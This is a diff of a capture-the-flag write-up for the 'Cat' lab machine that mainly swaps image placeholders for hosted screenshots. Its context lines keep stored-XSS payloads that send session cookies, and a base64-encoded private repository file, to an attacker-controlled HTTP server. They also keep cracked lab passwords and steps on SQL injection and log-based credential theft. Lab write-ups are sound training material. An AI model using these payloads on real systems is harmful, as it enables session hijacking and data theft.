@@ -1,6 +1,6 @@
 <h1>CAT WRITE UP</h1>
 
-{cat.png}<br>
+<img width="701" height="377" alt="cat" src="https://github.com/user-attachments/assets/7aef60ee-9262-4f2d-bf1d-da6613990c17" /><br>
 
 <h2>MACHINE INFORMATION</h2>
 
@@ -24,13 +24,13 @@ Cat is a medium-difficulty Linux machine that features a custom PHP web applicat
 
 Result:
 
-{ss1.png}<br>
+<img width="769" height="445" alt="ss1" src="https://github.com/user-attachments/assets/c5f5ac7f-d3f9-4dad-bc9c-38037ca063ae" /><br>
 
 As I can see port 22(SSH) and 80(HTTP) are open. Also there is "/.git/" directory. It means I can reach some source codes and files about application.
 
 <b>2-</b> First thing first, visit "10.10.11.53:80".
 
-{ss2.png}<br>
+<img width="1366" height="557" alt="ss2" src="https://github.com/user-attachments/assets/38490bae-cb5c-4f9d-828b-726bc67ced5f" /><br>
 
 In there I see on browser's url section is called "cat.htb". So I add "cat.htb" to my "/etc/hosts".
 
@@ -38,15 +38,15 @@ In there I see on browser's url section is called "cat.htb". So I add "cat.htb" 
 
 <b>3-</b> Now visit "http://cat.htb".
 
-{ss3.png}<br>
+<img width="1366" height="489" alt="ss3" src="https://github.com/user-attachments/assets/a53be803-0e9e-463d-9729-e3670fcf6cf7" /><br>
 
 There is a web page about some sort of cat competition. As a functionality I can register and login to the system, after that "Contest" part opens and I can give information about my cat.
 
-{ss4.png}<br>
+<img width="1366" height="688" alt="ss4" src="https://github.com/user-attachments/assets/b588c159-cc0e-4a77-8313-cc21f0f6e2a3" /><br>
 
 <b>4-</b> Now I visit "http://cat.htb/.git/".
 
-{ss5.png}<br>
+<img width="1366" height="238" alt="ss5" src="https://github.com/user-attachments/assets/8436b092-9e13-4960-9a3e-0aa83498361a" /><br>
 
 I dont have permission to see git files but I start directory enumeration to be sure.
 
@@ -54,11 +54,11 @@ I dont have permission to see git files but I start directory enumeration to be 
 
 Result:
 
-{ss6.png}<br>
+<img width="1036" height="448" alt="ss6" src="https://github.com/user-attachments/assets/8ca8d61c-1db8-4d5d-b270-8e1fb8706712" /><br>
 
 <b>5-</b> According to this result I visit "/HEAD" directory.
 
-{ss7.png}<br>
+<img width="1366" height="219" alt="ss7" src="https://github.com/user-attachments/assets/76780e0a-1130-4e71-b8cd-e5c028c64ce6" /><br>
 
 From now on i dump this git files with "git-dumper".
 
@@ -70,21 +70,21 @@ From now on i dump this git files with "git-dumper".
 
 Result:
 
-{ss8.png}<br>
+<img width="852" height="56" alt="ss8" src="https://github.com/user-attachments/assets/955d3b1a-e355-4570-b5ec-13b168a5d89e" /><br>
 
 <b>7-</b> First in "join.php" register function there is no filter for username input. That means I can inject any special characters as username value when I register.
 
-{ss9.png}<br>
+<img width="608" height="100" alt="ss9" src="https://github.com/user-attachments/assets/4787dc2b-0268-4c9b-9fe7-e104adb8a6f6" /><br>
 
 This vulnerable input can lead me to Stored XSS in "view_cat.php".
 
-{ss10.png}<br>
+<img width="862" height="201" alt="ss10" src="https://github.com/user-attachments/assets/35d95990-242a-46e1-8265-3143a75baf79" /><br>
 
 As I can see, my username value reflected here without any sanitazing. So I can execute XSS in here.
 
 <b>8-</b> Second in "accept_cat.php" as "catName" value send in to "cat_name" parameter and without any sanitazing using in SQL query.
 
-{ss11.png}<br>
+<img width="575" height="57" alt="ss11" src="https://github.com/user-attachments/assets/25bb9879-9722-426b-ab70-40d40bc29678" /><br>
 
 This can lead me to SQL Injection when I need it.
 
@@ -98,21 +98,21 @@ I start waiting request to my http server with cookie value in it.
 
 My payload= &lt;script&gt;fetch('http://10.10.14.106:8000/?cookie=' + document.cookie);&lt;/script&gt;
 
-{ss12.png}<br>
+<img width="639" height="520" alt="ss12" src="https://github.com/user-attachments/assets/4f5bdd6f-da3c-4b49-bc6c-4eaf51383658" /><br>
 
 And login the system.
 
-{ss13.png}<br>
+<img width="599" height="366" alt="ss13" src="https://github.com/user-attachments/assets/5846f5f8-c5ba-4df6-9eab-a65936d36a7f" /><br>
 
 <b>11-</b> Now I just send cat information for admin's approval.
 
-{ss14.png}<br>
+<img width="639" height="563" alt="ss14" src="https://github.com/user-attachments/assets/fc4695d3-7bc1-42df-ac0c-32c4c3ba066a" /><br>
 
 From now on I just wait to get request on my http server start earlier.
 
 <b>12-</b> And I get request with cookie value from the system.
 
-{ss15.png}<br>
+<img width="1050" height="100" alt="ss15" src="https://github.com/user-attachments/assets/5dee7ca8-0127-4512-a84a-ab41f2f22d37" /><br>
 
 I got admin user's session cookie. From now on I can reach admin functions with this cookie.
 
@@ -124,7 +124,7 @@ There it is, I know table name from source codes and again I know what kind of d
 
 Result:
 
-{ss16.png}<br>
+<img width="1292" height="306" alt="ss16" src="https://github.com/user-attachments/assets/15d041f3-cf55-46f8-aa8a-734f47196a35" /><br>
 
 I can see all users registered in the system.
 
@@ -132,7 +132,7 @@ I can see all users registered in the system.
 
 Result:
 
-{ss17.png}<br>
+<img width="1366" height="658" alt="ss17" src="https://github.com/user-attachments/assets/651f02b7-72f7-4a9e-b4af-a0ba209b0e87" /><br>
 
 There is only "rosa" user's password value cracked with application.
 
@@ -145,7 +145,7 @@ password= soyunaprincesarosa
 
 Result:
 
-{ss18.png}<br>
+<img width="970" height="633" alt="ss18" src="https://github.com/user-attachments/assets/19299d4e-8921-4d1d-b852-7f0b285b5f54" /><br>
 
 Yes, I got ssh connection to target machine.
 
@@ -155,7 +155,7 @@ Yes, I got ssh connection to target machine.
 
 Result:
 
-{ss19.png}<br>
+<img width="446" height="34" alt="ss19" src="https://github.com/user-attachments/assets/89876a43-ca6a-4049-adcb-0b4b29246010" /><br>
 
 There I see a group named as "adm". So I start research about adm group permissions.
 
@@ -163,7 +163,7 @@ There I see a group named as "adm". So I start research about adm group permissi
 
 Result:
 
-{ss20.png}<br>
+<img width="424" height="635" alt="ss20" src="https://github.com/user-attachments/assets/58cc41d1-6e68-4e2f-b090-817d1d4d940c" /><br>
 
 In this output most important data is in "/var/log/apache2" file.
 
@@ -173,7 +173,7 @@ In this output most important data is in "/var/log/apache2" file.
 
 Result:
 
-{ss21.png}<br>
+<img width="1359" height="274" alt="ss21" src="https://github.com/user-attachments/assets/f73a4078-27b6-4298-a681-d98257b58231" /><br>
 
 And yes I got "axel" user's password as "aNdZwgC4tI9gnVXv_e3Q".
 
@@ -186,13 +186,13 @@ password= aNdZwgC4tI9gnVXv_e3Q
 
 Result:
 
-{ss22.png}<br>
+<img width="838" height="550" alt="ss22" src="https://github.com/user-attachments/assets/f7c5476e-dd8b-4704-b6fa-988cab6f2a2f" /><br>
 
 And this is how I get user flag!!!
 
 <b>19-</b> After I logged in as "axel" there is a notification like "You have mail.".
 
-{ss23.png}<br>
+<img width="950" height="583" alt="ss23" src="https://github.com/user-attachments/assets/e00946e2-7107-4d56-808a-8da4aa4b5fd3" /><br>
 
 <b>20-</b> I read "axel" user's mails.
 
@@ -200,7 +200,8 @@ And this is how I get user flag!!!
 
 Result:
 
-{ss24.png}<br>
+<img width="1366" height="632" alt="ss24" src="https://github.com/user-attachments/assets/4d245e63-d964-4714-95aa-04f005871f8a" />
+<br>
 
 <b>21-</b> Because second mail mentioned localhost:3000, I decide to look target machine's local ports.
 
@@ -208,7 +209,7 @@ Result:
 
 Result:
 
-{ss25.png}<br>
+<img width="612" height="229" alt="ss25" src="https://github.com/user-attachments/assets/f1e82160-ac64-45bb-aac0-bcee9f430031" /><br>
 
 It confirmed port 3000 open and listening state.
 
@@ -220,13 +221,13 @@ And visit "http://localhost:3000" on my browser.
 
 Result:
 
-{ss26.png}<br>
+<img width="1366" height="687" alt="ss26" src="https://github.com/user-attachments/assets/4722ddf0-aa44-4b44-9a1b-3fd3245e009a" /><br>
 
 Gitea server welcomes me.
 
 <b>23-</b> Most important part is version number for this gitea server.
 
-{ss27.png}<br>
+<img width="393" height="32" alt="ss27" src="https://github.com/user-attachments/assets/d4f86b57-5b08-4d66-9a1b-eed4c02b939a" /><br>
 
 When I research about this version number, I find some vulnerability to exploit. Here is the <a href="https://www.exploit-db.com/exploits/52077">CVE-2024-6886</a>
 
@@ -234,7 +235,7 @@ When I research about this version number, I find some vulnerability to exploit.
 
 Payload= &lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.106:4545/?content="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS fnwn&lt;/a&gt;
 
-{ss28.png}<br>
+<img width="798" height="535" alt="ss28" src="https://github.com/user-attachments/assets/513d9790-a8ce-46ae-bfca-998a1998e94e" /><br>
 
 My idea is to get "index.php" source code as root user, maybe I'll get some information from there.
 
@@ -252,7 +253,7 @@ If everything works I want to see request on my http server.
 
 Result:
 
-{ss29.png}<br>
+<img width="1353" height="119" alt="ss29" src="https://github.com/user-attachments/assets/d33aeace-baa5-4633-8539-427be3170899" /><br>
 
 Now I need to decode this base64 output.
 
@@ -262,7 +263,7 @@ Now I need to decode this base64 output.
 
 Result:
 
-{ss30.png}<br>
+<img width="1355" height="288" alt="ss30" src="https://github.com/user-attachments/assets/baf80c46-189c-4b0e-862c-97ed1f225c76" /><br>
 
 Now I got root user password.
 
@@ -274,7 +275,7 @@ Password= IKw75eR0MR7CMIxhH0
 
 Result:
 
-{ss31.png}<br>
+<img width="248" height="101" alt="ss31" src="https://github.com/user-attachments/assets/65eeca83-22a8-4d02-b2d1-9e9caa79155f" /><br>
 
 And this is how I get root flag!!!
 
